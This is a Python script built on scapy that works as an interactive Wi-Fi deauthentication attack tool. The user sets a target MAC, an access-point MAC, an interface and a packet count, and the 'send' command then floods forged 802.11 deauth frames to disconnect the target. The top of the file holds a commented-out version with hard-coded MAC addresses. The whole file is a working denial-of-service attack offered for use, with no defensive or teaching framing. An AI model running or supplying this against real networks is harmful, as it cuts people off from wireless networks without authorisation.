from scapy.all import *
#targmac = "A0:CC:2B:BD:E2:9D"
#apmac = "60:38:E0:7D:68:5B"
#packet = RadioTap()/Dot11(addr1=targmac,addr2=apmac,addr3=apmac)/Dot11Deauth()
#sendp(packet,iface="wlan0",count=1000,inter=.2)
print("      ::::::::: ::::::::::\n     :+:    :+::+:\n    +:+    +:++:+\n   +#+    +:++#++:++#\n  +#+    +#++#+\n #+#    #+##+#\n######### ####################\n\n------------------------------\nDont forget to set airmon to the right channel.\n")
accessPointMac = "00:00:00:00:00:00"
targetMac = "00:00:00:00:00:00"
packetAmmount = 100
inFace = "changeMe"

while(True):
    userInput = input(">>_ ")
    userInput = userInput.lower()

    if(userInput=="target"):
        newMac = input("Please type the targets mac address: ")
        targetMac = newMac
        newMac = ""
    
    if(userInput=="access-point"):
        newMac = input("Please type the access points mac address: ")
        accessPointMac = newMac
        newMac = ""

    if(userInput=="?"):
        print("quit               :Leaves the program.\ntarget             :Sets the target machine(MacAddress)\naccess-point       :Sets the access point(MacAddress)\niface              :Set the broadcasting interface\npacket-count       :Set the ammount of packets to send\nsend               :Starts the attack")

    if(userInput=="check"):
        print("Access-Point              : {0}\nTarget-Machine            : {1}\nPackets-sent              : {2}\nInterface                 : {3}".format(accessPointMac,targetMac,str(packetAmmount),inFace))

    if(userInput=="iface"):
        newIFace = input("Please input the interface you wish to broadcast on: ")
        inFace = newIFace
        newIFace = ""

    if(userInput == "packet-count"):
        newCount = input("Please type the ammount of packets you want to send: ")
        packetAmmount = int(newCount)
        newCount = ""

    if(userInput=="send"):
        if(accessPointMac=="00:00:00:00:00:00"):
            print("The mac address of the access point is still set to the default value.")
            continue
        elif(targetMac=="00:00:00:00:00:00"):
            print("The mac address of the target machine is set to the default value.")
            continue
        else:#addr1 = Destination mac; addr2 = access point mac address; addr3 = bssid of access point mac
            packet = RadioTap()/Dot11(addr1=targetMac,addr2=accessPointMac,addr3=accessPointMac)/Dot11Deauth()
            sendp(packet,iface=inFace,count=packetAmmount,inter=.2)
        


    if(userInput=="quit"):
        break
    



